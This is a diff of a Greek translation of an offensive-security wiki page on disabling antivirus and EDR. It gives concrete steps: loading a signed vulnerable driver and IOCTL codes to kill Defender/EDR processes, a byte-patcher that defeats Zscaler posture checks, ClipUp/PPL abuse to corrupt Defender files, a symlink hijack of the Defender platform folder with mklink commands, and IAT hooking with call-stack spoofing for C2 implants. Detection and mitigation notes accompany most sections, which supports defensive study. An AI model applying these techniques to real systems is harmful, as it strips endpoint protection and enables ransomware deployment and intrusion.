+Το Storm-2603 αξιοποίησε ένα μικρό console utility, γνωστό ως **Antivirus Terminator**, για να απενεργοποιήσει τις endpoint protections πριν από την ανάπτυξη ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *signed* driver** και τον καταχράται για την εκτέλεση privileged kernel operations, τις οποίες δεν μπορούν να μπλοκάρουν ούτε οι AV services τύπου Protected-Process-Light (PPL).
 
-Key take-aways
-1. **Signed driver**: Το αρχείο που παραδίδεται στο disk είναι το `ServiceMouse.sys`, αλλά το binary είναι το νόμιμα signed driver `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή ο driver φέρει έγκυρο Microsoft signature φορτώνεται ακόμη και όταν το Driver-Signature-Enforcement (DSE) είναι ενεργό.
-2. **Service installation**:
+Βασικά συμπεράσματα
+1. **Signed driver**: Το αρχείο που παραδίδεται στον δίσκο είναι το `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα signed driver `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή ο driver φέρει έγκυρη Microsoft signature, φορτώνεται ακόμη και όταν είναι ενεργοποιημένο το Driver-Signature-Enforcement (DSE).
+2. **Εγκατάσταση service**:
 ```powershell
 sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
 sc start  ServiceMouse
 ```
-Η πρώτη γραμμή καταχωρεί τον driver ως **kernel service** και η δεύτερη τον εκκινεί ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από το user land.
-3. **IOCTLs exposed by the driver**
-| IOCTL code | Capability                              |
+Η πρώτη γραμμή καταχωρίζει τον driver ως **kernel service** και η δεύτερη τον εκκινεί, ώστε το `\\.\ServiceMouse` να είναι προσβάσιμο από το user land.
+3. **IOCTLs που εκτίθενται από τον driver**
+| Κωδικός IOCTL | Δυνατότητα                              |
 |-----------:|-----------------------------------------|
-| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
-| `0x990000D0` | Delete an arbitrary file on disk |
-| `0x990001D0` | Unload the driver and remove the service |
+| `0x99000050` | Τερματισμός αυθαίρετης διεργασίας μέσω PID (χρησιμοποιείται για τον τερματισμό Defender/EDR services) |
+| `0x990000D0` | Διαγραφή αυθαίρετου αρχείου από τον δίσκο |
+| `0x990001D0` | Unload του driver και αφαίρεση του service |
 
 Minimal C proof-of-concept:
 ```c
@@ -819,30 +819,30 @@ CloseHandle(hDrv);
 return 0;
 }
 ```
-4. **Why it works**:  BYOVD παρακάμπτει πλήρως τις user-mode προστασίες· code που εκτελείται στο kernel μπορεί να ανοίξει *protected* processes, να τα τερματίσει ή να αλλοιώσει kernel objects ανεξάρτητα από τα PPL/PP, ELAM ή άλλα hardening features.
+4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις user-mode protections· ο κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *protected* processes, να τις τερματίσει ή να παραποιήσει kernel objects, ανεξάρτητα από τα PPL/PP, ELAM ή άλλες hardening features.
 
-Detection / Mitigation
-•  Ενεργοποιήστε το vulnerable-driver block list της Microsoft (`HVCI`, `Smart App Control`) ώστε τα Windows να αρνούνται να φορτώσουν το `AToolsKrnl64.sys`.
-•  Παρακολουθείτε δημιουργίες νέων *kernel* services και κάνετε alert όταν ένας driver φορτώνεται από world-writable directory ή δεν υπάρχει στη allow-list.
-•  Παρακολουθείτε για user-mode handles προς custom device objects που ακολουθούνται από ύποπτα `DeviceIoControl` calls.
+Ανίχνευση / Μετριασμός
+•  Ενεργοποιήστε τη vulnerable-driver block list της Microsoft (`HVCI`, `Smart App Control`), ώστε τα Windows να αρνούνται να φορτώσουν το `AToolsKrnl64.sys`.
+•  Παρακολουθήστε τη δημιουργία νέων *kernel* services και δημιουργήστε alert όταν ένας driver φορτώνεται από world-writable directory ή δεν υπάρχει στη allow-list.
+•  Παρακολουθήστε user-mode handles προς custom device objects, ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.
 
-### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching
+### Παράκαμψη των Posture Checks του Zscaler Client Connector μέσω On-Disk Binary Patching
 
-Το **Client Connector** της Zscaler εφαρμόζει device-posture rules τοπικά και βασίζεται στο Windows RPC για να επικοινωνεί τα αποτελέσματα σε άλλα components. Δύο αδύναμες σχεδιαστικές επιλογές κάνουν δυνατό ένα πλήρες bypass:
+Το **Client Connector** της Zscaler εφαρμόζει τοπικά κανόνες device-posture και βασίζεται στα Windows RPC για την επικοινωνία των αποτελεσμάτων με άλλα components. Δύο αδύναμες επιλογές σχεδιασμού καθιστούν δυνατή μια πλήρη παράκαμψη:
 
-1. Η αξιολόγηση posture γίνεται **εξ ολοκλήρου client-side** (στέλνεται ένα boolean στον server).
-2. Τα εσωτερικά RPC endpoints ελέγχουν μόνο ότι το executable που συνδέεται είναι **signed by Zscaler** (μέσω `WinVerifyTrust`).
+1. Η αξιολόγηση του posture πραγματοποιείται **εξ ολοκλήρου client-side** (ένα boolean αποστέλλεται στον server).
+2. Τα internal RPC endpoints επικυρώνουν μόνο ότι το executable που συνδέεται είναι **signed by Zscaler** (μέσω του `WinVerifyTrust`).
 
-Με το **patching τεσσάρων signed binaries on disk** και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:
+Με το **patching τεσσάρων signed binaries στον δίσκο**, και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:
 
-| Binary | Original logic patched | Result |
+| Binary | Αρχική λογική που έγινε patch | Αποτέλεσμα |
 |--------|------------------------|---------|
-| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Πάντα επιστρέφει `1` ώστε κάθε check να είναι compliant |
-| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
+| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, επομένως κάθε check θεωρείται compliant |
+| `ZSAService.exe` | Indirect call προς το `WinVerifyTrust` | Έγινε NOP-ed ⇒ οποιαδήποτε διεργασία, ακόμη και unsigned, μπορεί να συνδεθεί στα RPC pipes |
 | `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαταστάθηκε από `mov eax,1 ; ret` |
-| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |
+| `ZSATunnel.exe` | Integrity checks στο tunnel | Έγινε short-circuited |
 
-Minimal patcher excerpt:
+Απόσπασμα από minimal patcher:
 ```python
 pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
 replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1
@@ -858,29 +858,29 @@ f.write(replacement)
 ```
 Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση του service stack:
 
-* **Όλα** τα posture checks εμφανίζονται **πράσινα/compliant**.
-* Unsigned ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
+* **Όλοι** οι posture checks εμφανίζονται ως **green/compliant**.
+* Τα unsigned ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
 * Το compromised host αποκτά unrestricted access στο internal network που ορίζεται από τις Zscaler policies.
 
-Αυτή η case study δείχνει πώς καθαρά client-side trust decisions και απλοί signature checks μπορούν να defeated με λίγα byte patches.
+Αυτό το case study δείχνει πώς αποφάσεις trust που λαμβάνονται αποκλειστικά από την πλευρά του client και απλοί signature checks μπορούν να παρακαμφθούν με μερικά byte patches.
 
 ## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs
 
-Το Protected Process Light (PPL) επιβάλλει μια signer/level hierarchy, ώστε μόνο processes με equal-or-higher προστασία να μπορούν να tamper με το ένα το άλλο. Offensive, αν μπορείς να εκκινήσεις νόμιμα ένα PPL-enabled binary και να ελέγξεις τα arguments του, μπορείς να μετατρέψεις benign functionality (π.χ. logging) σε ένα constrained, PPL-backed write primitive απέναντι σε protected directories που χρησιμοποιούνται από AV/EDR.
+Το Protected Process Light (PPL) επιβάλλει μια signer/level hierarchy, ώστε μόνο protected processes ίδιου ή υψηλότερου επιπέδου να μπορούν να κάνουν tamper μεταξύ τους. Από επιθετικής πλευράς, αν μπορείτε να εκκινήσετε νόμιμα ένα PPL-enabled binary και να ελέγξετε τα arguments του, μπορείτε να μετατρέψετε benign functionality (π.χ. logging) σε ένα constrained, PPL-backed write primitive εναντίον protected directories που χρησιμοποιούνται από AV/EDR.
 
-Τι κάνει ένα process να τρέχει ως PPL
-- Το target EXE (και οποιαδήποτε loaded DLLs) πρέπει να είναι signed με ένα PPL-capable EKU.
-- Το process πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
-- Πρέπει να ζητηθεί ένα compatible protection level που να ταιριάζει με τον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Τα λάθος levels θα αποτύχουν κατά τη δημιουργία.
+Τι κάνει μια process να εκτελείται ως PPL
+- Το target EXE (και τυχόν loaded DLLs) πρέπει να είναι signed με PPL-capable EKU.
+- Η process πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
+- Πρέπει να ζητηθεί compatible protection level που να ταιριάζει με τον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λανθασμένα levels θα αποτύχουν κατά τη δημιουργία.
 
-Δες επίσης μια πιο ευρεία εισαγωγή στο PP/PPL και στο LSASS protection εδώ:
+Δείτε επίσης μια ευρύτερη εισαγωγή στα PP/PPL και στο LSASS protection εδώ:
 
 {{#ref}}
 stealing-credentials/credentials-protections.md
 {{#endref}}
 
-Launcher tooling
-- Open-source helper: CreateProcessAsPPL (επιλέγει protection level και προωθεί arguments στο target EXE):
+Εργαλεία εκκίνησης
+- Open-source helper: CreateProcessAsPPL (επιλέγει protection level και προωθεί τα arguments στο target EXE):
 - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
 - Usage pattern:
 ```text
@@ -891,19 +891,19 @@ CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
 CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
 ```
 LOLBIN primitive: ClipUp.exe
-- Το signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns και δέχεται μία παράμετρο για να γράψει ένα log file σε ένα path που καθορίζει ο caller.
-- Όταν εκκινείται ως PPL process, το file write γίνεται με PPL backing.
-- Το ClipUp δεν μπορεί να κάνει parse paths που περιέχουν spaces· χρησιμοποίησε 8.3 short paths για να δείξεις σε κανονικά protected locations.
+- Το signed system binary `C:\Windows\System32\ClipUp.exe` εκκινείται από μόνο του και δέχεται μια παράμετρο για την εγγραφή ενός log file σε path που καθορίζει ο caller.
+- Όταν εκκινείται ως PPL process, η εγγραφή του file πραγματοποιείται με PPL backing.
+- Το ClipUp δεν μπορεί να κάνει parse paths που περιέχουν spaces· χρησιμοποιήστε 8.3 short paths για να δείξετε σε κανονικά protected locations.
 
 8.3 short path helpers
-- Λίστα short names: `dir /x` σε κάθε parent directory.
-- Derive short path σε cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`
+- List short names: `dir /x` σε κάθε parent directory.
+- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`
 
 Abuse chain (abstract)
-1) Launch the PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ. CreateProcessAsPPL).
-2) Πέρασε το ClipUp log-path argument για να εξαναγκάσεις file creation σε ένα protected AV directory (π.χ., Defender Platform). Χρησιμοποίησε 8.3 short names αν χρειάζεται.
-3) Αν το target binary είναι συνήθως open/locked by the AV ενώ τρέχει (π.χ., MsMpEng.exe), προγραμμάτισε το write στο boot πριν ξεκινήσει το AV εγκαθιστώντας ένα auto-start service που εκτελείται αξιόπιστα νωρίτερα. Επικύρωσε το boot ordering με Process Monitor (boot logging).
-4) Στο reboot το PPL-backed write γίνεται πριν το AV κλειδώσει τα binaries του, corrupting το target file και preventing startup.
+1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ. CreateProcessAsPPL).
+2) Περάστε στο ClipUp το log-path argument για να επιβάλετε τη δημιουργία ενός file σε protected AV directory (π.χ. Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειάζεται.
+3) Αν το target binary είναι συνήθως ανοιχτό/locked από το AV ενώ εκτελείται (π.χ. MsMpEng.exe), προγραμματίστε την εγγραφή στο boot, πριν ξεκινήσει το AV, εγκαθιστώντας ένα auto-start service που εκτελείται αξιόπιστα νωρίτερα. Επικυρώστε τη σειρά εκκίνησης με το Process Monitor (boot logging).
+4) Μετά το reboot, η PPL-backed εγγραφή πραγματοποιείται πριν το AV κλειδώσει τα binaries του, καταστρέφοντας το target file και αποτρέποντας την εκκίνηση.
 
 Example invocation (paths redacted/shortened for safety):
 ```text
@@ -911,21 +911,21 @@ Example invocation (paths redacted/shortened for safety):
 CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
 ```
 Σημειώσεις και περιορισμοί
-- Δεν μπορείς να ελέγξεις το περιεχόμενο που γράφει το ClipUp πέρα από την τοποθέτηση· το primitive είναι κατάλληλο για corruption και όχι για ακριβές content injection.
-- Απαιτεί local admin/SYSTEM για να εγκαταστήσεις/ξεκινήσεις ένα service και ένα reboot window.
-- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά το boot αποφεύγει τα file locks.
+- Δεν μπορείτε να ελέγξετε τα περιεχόμενα που γράφει το ClipUp πέρα από τη θέση τους· το primitive είναι κατάλληλο για corruption και όχι για ακριβή content injection.
+- Απαιτούνται local admin/SYSTEM για την εγκατάσταση/εκκίνηση ενός service και ένα reboot window.
+- Το timing είναι κρίσιμο: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά το boot αποφεύγει τα file locks.
 
-Ανιχνεύσεις
-- Process creation του `ClipUp.exe` με ασυνήθιστες παραμέτρους, ειδικά όταν έχει parent μη τυπικά launchers, γύρω από το boot.
-- Νέα services ρυθμισμένα να auto-start suspicious binaries και που ξεκινούν σταθερά πριν από Defender/AV. Ερεύνησε service creation/modification πριν από Defender startup failures.
-- File integrity monitoring σε Defender binaries/Platform directories· απροσδόκητα file creations/modifications από processes με protected-process flags.
-- ETW/EDR telemetry: ψάξε για processes που δημιουργήθηκαν με `CREATE_PROTECTED_PROCESS` και για ανώμαλη χρήση PPL level από non-AV binaries.
+Detections
+- Process creation του `ClipUp.exe` με ασυνήθιστα arguments, ειδικά όταν έχει ως parent μη τυπικούς launchers, κατά το boot.
+- Νέα services ρυθμισμένα για auto-start ύποπτων binaries, τα οποία ξεκινούν σταθερά πριν από το Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση services πριν από failures κατά την εκκίνηση του Defender.
+- File integrity monitoring σε Defender binaries/Platform directories· μη αναμενόμενες δημιουργίες/τροποποιήσεις αρχείων από processes με protected-process flags.
+- ETW/EDR telemetry: αναζητήστε processes που δημιουργούνται με `CREATE_PROTECTED_PROCESS` και anomalous χρήση PPL level από non-AV binaries.
 
 Mitigations
-- WDAC/Code Integrity: περιόρισε ποια signed binaries μπορούν να τρέξουν ως PPL και υπό ποιους parents· μπλόκαρε ClipUp invocation εκτός legitimate contexts.
-- Service hygiene: περιόρισε τη δημιουργία/modification auto-start services και παρακολούθησε manipulation του start-order.
-- Βεβαιώσου ότι το Defender tamper protection και τα early-launch protections είναι ενεργοποιημένα· ερεύνησε startup errors που δείχνουν binary corruption.
-- Σκέψου να απενεργοποιήσεις το 8.3 short-name generation σε volumes που φιλοξενούν security tooling, αν είναι συμβατό με το περιβάλλον σου (δοκίμασέ το διεξοδικά).
+- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να εκτελούνται ως PPL και κάτω από ποιους parents· αποκλείστε την invocation του ClipUp εκτός legitimate contexts.
+- Service hygiene: περιορίστε τη δημιουργία/τροποποίηση auto-start services και παρακολουθείτε τη χειραγώγηση της σειράς εκκίνησης.
+- Βεβαιωθείτε ότι είναι ενεργοποιημένα τα Defender tamper protection και early-launch protections· ερευνήστε startup errors που υποδεικνύουν binary corruption.
+- Εξετάστε την απενεργοποίηση της δημιουργίας 8.3 short names σε volumes που φιλοξενούν security tooling, εφόσον είναι συμβατό με το περιβάλλον σας (κάντε thorough testing).
 
 References for PPL and tooling
 - Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
@@ -936,67 +936,67 @@ References for PPL and tooling
 
 ## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack
 
-Το Windows Defender επιλέγει το platform από το οποίο θα τρέξει με απαρίθμηση των subfolders κάτω από:
+Το Windows Defender επιλέγει την platform από την οποία εκτελείται, απαριθμώντας τα subfolders κάτω από:
 - `C:\ProgramData\Microsoft\Windows Defender\Platform\`
 
-Επιλέγει το subfolder με το υψηλότερο lexicographic version string (π.χ. `4.18.25070.5-0`), και μετά ξεκινά από εκεί τα Defender service processes (ενημερώνοντας αντίστοιχα τα service/registry paths). Αυτή η επιλογή εμπιστεύεται directory entries, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας administrator μπορεί να το εκμεταλλευτεί για να ανακατευθύνει το Defender σε attacker-writable path και να πετύχει DLL sideloading ή service disruption.
+Επιλέγει το subfolder με το υψηλότερο lexicographic version string (π.χ. `4.18.25070.5-0`) και στη συνέχεια εκκινεί από εκεί τα Defender service processes (ενημερώνοντας αντίστοιχα τα service/registry paths). Αυτή η επιλογή εμπιστεύεται τα directory entries, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας administrator μπορεί να το εκμεταλλευτεί για να ανακατευθύνει το Defender σε attacker-writable path και να επιτύχει DLL sideloading ή service disruption.
 
-Προϋποθέσεις
-- Local Administrator (απαιτείται για να δημιουργήσεις directories/symlinks κάτω από το Platform folder)
-- Δυνατότητα reboot ή trigger επανεπιλογής Defender platform (service restart στο boot)
-- Απαιτούνται μόνο built-in tools (mklink)
+Preconditions
+- Local Administrator (απαιτείται για τη δημιουργία directories/symlinks κάτω από το Platform folder)
+- Δυνατότητα reboot ή trigger του Defender platform re-selection (service restart κατά το boot)
+- Απαιτούνται μόνο built-in tools (`mklink`)
 
-Γιατί λειτουργεί
-- Το Defender μπλοκάρει writes στους δικούς του folders, αλλά η επιλογή platform εμπιστεύεται directory entries και επιλέγει το lexicographically υψηλότερο version χωρίς να επαληθεύει ότι το target επιλύεται σε protected/trusted path.
+Why it works
+- Το Defender αποκλείει writes στους δικούς του φακέλους, αλλά η επιλογή της platform εμπιστεύεται τα directory entries και επιλέγει την έκδοση με το υψηλότερο lexicographic όνομα, χωρίς να επικυρώνει ότι ο προορισμός επιλύεται σε protected/trusted path.
 
-Βήμα-βήμα (παράδειγμα)
-1) Προετοίμασε ένα writable clone του τρέχοντος platform folder, π.χ. `C:\TMP\AV`:
+Step-by-step (example)
+1) Προετοιμάστε ένα writable clone του τρέχοντος platform folder, π.χ. `C:\TMP\AV`:
 ```cmd
 set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
 set DST="C:\TMP\AV"
 robocopy %SRC% %DST% /MIR
 ```
-2) Δημιούργησε ένα symlink καταλόγου υψηλότερης έκδοσης μέσα στο Platform που να δείχνει στον φάκελό σου:
+2) Δημιουργήστε ένα symlink καταλόγου υψηλότερης έκδοσης μέσα στο Platform που να δείχνει στον φάκελό σας:
 ```cmd
 mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
 ```
-3) Επιλογή ενεργοποίησης (συνιστάται επανεκκίνηση):
+3) Επιλογή trigger (συνιστάται επανεκκίνηση):
 ```cmd
 shutdown /r /t 0
 ```
-4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από το ανακατευθυνόμενο path:
+4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
 ```powershell
 Get-Process MsMpEng | Select-Object Id,Path
 # or
 wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
 ```
-Θα πρέπει να παρατηρήσετε το νέο process path κάτω από `C:\TMP\AV\` και τη ρύθμιση της υπηρεσίας/registry που αντικατοπτρίζει αυτήν τη θέση.
+Θα πρέπει να παρατηρήσετε τη νέα διαδρομή διεργασίας στο `C:\TMP\AV\` και τις ρυθμίσεις του service/το registry να αντικατοπτρίζουν αυτήν την τοποθεσία.
 
-Post-exploitation options
-- DLL sideloading/code execution: Drop/replace DLLs that Defender loads from its application directory to execute code in Defender’s processes. Δείτε την ενότητα παραπάνω: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
-- Service kill/denial: Αφαιρέστε το version-symlink ώστε στην επόμενη εκκίνηση το configured path να μην επιλύεται και το Defender να αποτυγχάνει να ξεκινήσει:
+Επιλογές Post-exploitation
+- DLL sideloading/code execution: Τοποθετήστε/αντικαταστήστε DLLs που φορτώνει το Defender από τον κατάλογο της εφαρμογής του, ώστε να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την παραπάνω ενότητα: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
+- Τερματισμός/άρνηση service: Αφαιρέστε το version-symlink, ώστε στην επόμενη εκκίνηση η διαμορφωμένη διαδρομή να μην επιλύεται και το Defender να αποτυγχάνει να εκκινηθεί:
 ```cmd
 rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
 ```
 > [!TIP]
-> Σημείωση ότι αυτή η τεχνική δεν παρέχει από μόνη της privilege escalation· απαιτεί admin rights.
+> Σημειώστε ότι αυτή η technique δεν παρέχει privilege escalation από μόνη της· απαιτεί δικαιώματα admin.
 
 ## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)
 
-Οι red teams μπορούν να μεταφέρουν το runtime evasion έξω από το C2 implant και μέσα στο ίδιο το target module, κάνοντας hook το Import Address Table (IAT) του και δρομολογώντας επιλεγμένα APIs μέσω attacker-controlled, position‑independent code (PIC). Αυτό γενικεύει το evasion πέρα από τη μικρή API surface που εκθέτουν πολλά kits (π.χ. CreateProcessA), και επεκτείνει τις ίδιες προστασίες σε BOFs και post‑exploitation DLLs.
+Οι red teams μπορούν να μεταφέρουν το runtime evasion έξω από το C2 implant και μέσα στο ίδιο το target module, κάνοντας hooking στο Import Address Table (IAT) του και δρομολογώντας επιλεγμένα APIs μέσω attacker-controlled, position-independent code (PIC). Αυτό γενικεύει το evasion πέρα από το μικρό API surface που εκθέτουν πολλά kits (π.χ., CreateProcessA) και επεκτείνει τις ίδιες προστασίες σε BOFs και post-exploitation DLLs.
 
 High-level approach
-- Στήσε ένα PIC blob δίπλα στο target module χρησιμοποιώντας έναν reflective loader (prepended ή companion). Το PIC πρέπει να είναι self-contained και position-independent.
-- Καθώς φορτώνεται το host DLL, κάνε walk το IMAGE_IMPORT_DESCRIPTOR του και κάνε patch τα IAT entries για targeted imports (π.χ. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ώστε να δείχνουν σε thin PIC wrappers.
+- Κάντε stage ένα PIC blob μαζί με το target module χρησιμοποιώντας reflective loader (prepended ή companion). Το PIC πρέπει να είναι self-contained και position-independent.
+- Κατά τη φόρτωση του host DLL, διασχίστε το IMAGE_IMPORT_DESCRIPTOR και κάντε patch στις IAT entries για τα στοχευμένα imports (π.χ., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), ώστε να δείχνουν σε thin PIC wrappers.
 - Κάθε PIC wrapper εκτελεί evasions πριν κάνει tail-call στο πραγματικό API address. Τυπικά evasions περιλαμβάνουν:
-- Memory mask/unmask γύρω από το call (π.χ. encrypt beacon regions, RWX→RX, αλλαγή page names/permissions) και μετά restore post‑call.
-- Call-stack spoofing: κατασκεύασε ένα benign stack και πέρασε στο target API ώστε η call-stack analysis να καταλήγει σε αναμενόμενα frames.
-- Για συμβατότητα, κάνε export ένα interface ώστε ένα Aggressor script (ή ισοδύναμο) να μπορεί να δηλώσει ποια APIs θα γίνονται hook για Beacon, BOFs και post‑ex DLLs.
+- Memory mask/unmask γύρω από το call (π.χ., encrypt beacon regions, RWX→RX, αλλαγή page names/permissions) και στη συνέχεια restore μετά το call.
+- Call-stack spoofing: κατασκευή benign stack και transition στο target API, ώστε το call-stack analysis να επιλύεται στα αναμενόμενα frames.
+- Για compatibility, κάντε export ένα interface ώστε ένα Aggressor script (ή equivalent) να μπορεί να καταχωρίζει ποια APIs θα γίνονται hook για Beacon, BOFs και post-ex DLLs.
 
 Why IAT hooking here
-- Λειτουργεί για κάθε code που χρησιμοποιεί το hooked import, χωρίς να τροποποιείς τον tool code ή να βασίζεσαι στο Beacon για proxy συγκεκριμένα APIs.
-- Καλύπτει post‑ex DLLs: το hooking των LoadLibrary* σου επιτρέπει να interceptάρεις module loads (π.χ. System.Management.Automation.dll, clr.dll) και να εφαρμόσεις το ίδιο masking/stack evasion στις API calls τους.
-- Αποκαθιστά αξιόπιστη χρήση των process-spawning post-ex commands απέναντι σε call-stack–based detections, μέσω wrapping των CreateProcessA/W.
+- Λειτουργεί για οποιονδήποτε κώδικα χρησιμοποιεί το hooked import, χωρίς τροποποίηση του tool code ή εξάρτηση από το Beacon για proxy συγκεκριμένων APIs.
+- Καλύπτει post-ex DLLs: το hooking των LoadLibrary* σάς επιτρέπει να intercept module loads (π.χ., System.Management.Automation.dll, clr.dll) και να εφαρμόζετε το ίδιο masking/stack evasion στα API calls τους.
+- Επαναφέρει την αξιόπιστη χρήση post-ex commands που κάνουν process spawning απέναντι σε detections βασισμένα στο call stack, κάνοντας wrapping στα CreateProcessA/W.
 
 Minimal IAT hook sketch (x64 C/C++ pseudocode)
 ```c
@@ -1006,28 +1006,28 @@ Minimal IAT hook sketch (x64 C/C++ pseudocode)
 //       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
 // Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
 ```
-Σημειώσεις
-- Εφάρμοσε το patch μετά τα relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως TitanLdr/AceLdr δείχνουν hooking κατά το DllMain του loaded module.
-- Κράτα τα wrappers μικρά και PIC-safe· επίλυσε το true API μέσω της original IAT value που κατέγραψες πριν το patching ή μέσω LdrGetProcedureAddress.
-- Χρησιμοποίησε RW → RX transitions για PIC και απέφυγε να αφήνεις writable+executable pages.
+Notes
+- Εφάρμοσε το patch μετά τις relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως τα TitanLdr/AceLdr επιδεικνύουν hooking κατά τη διάρκεια του DllMain του loaded module.
+- Κράτησε τα wrappers μικρά και PIC-safe· κάνε resolve το πραγματικό API μέσω της αρχικής τιμής IAT που κατέγραψες πριν από το patching ή μέσω του LdrGetProcedureAddress.
+- Χρησιμοποίησε μεταβάσεις RW → RX για το PIC και απόφυγε να αφήνεις σελίδες ταυτόχρονα writable+executable.
 
-Call‑stack spoofing stub
-- Draugr‑style PIC stubs χτίζουν ένα fake call chain (return addresses μέσα σε benign modules) και μετά pivotάρουν στο real API.
+Call-stack spoofing stub
+- PIC stubs τύπου Draugr δημιουργούν μια ψεύτικη call chain (return addresses μέσα σε benign modules) και στη συνέχεια κάνουν pivot στο πραγματικό API.
 - Αυτό παρακάμπτει detections που περιμένουν canonical stacks από Beacon/BOFs προς sensitive APIs.
-- Συνδύασέ το με stack cutting/stack stitching techniques για να προσγειωθείς μέσα σε αναμενόμενα frames πριν από το API prologue.
+- Συνδύασέ το με τεχνικές stack cutting/stack stitching, ώστε να καταλήγεις μέσα στα αναμενόμενα frames πριν από το API prologue.
 
 Operational integration
-- Πρόθεσε τον reflective loader στα post-ex DLLs ώστε το PIC και τα hooks να αρχικοποιούνται αυτόματα όταν φορτώνεται το DLL.
-- Χρησιμοποίησε ένα Aggressor script για να καταχωρήσεις target APIs ώστε Beacon και BOFs να επωφελούνται διαφανώς από το ίδιο evasion path χωρίς code changes.
+- Πρόσθεσε τον reflective loader στην αρχή των post-ex DLLs, ώστε τα PIC και hooks να αρχικοποιούνται αυτόματα όταν φορτώνεται το DLL.
+- Χρησιμοποίησε ένα Aggressor script για να καταχωρίζεις τα target APIs, ώστε τα Beacon και BOFs να επωφελούνται διαφανώς από το ίδιο evasion path χωρίς αλλαγές στον κώδικα.
 
 Detection/DFIR considerations
-- IAT integrity: entries που επιλύονται σε non-image (heap/anon) addresses· περιοδική επαλήθευση των import pointers.
+- IAT integrity: entries που κάνουν resolve σε non-image (heap/anon) addresses· περιοδική επαλήθευση των import pointers.
 - Stack anomalies: return addresses που δεν ανήκουν σε loaded images· απότομες μεταβάσεις σε non-image PIC· ασυνεπής RtlUserThreadStart ancestry.
-- Loader telemetry: in-process writes στο IAT, early DllMain activity που τροποποιεί import thunks, απροσδόκητες RX regions που δημιουργούνται κατά το load.
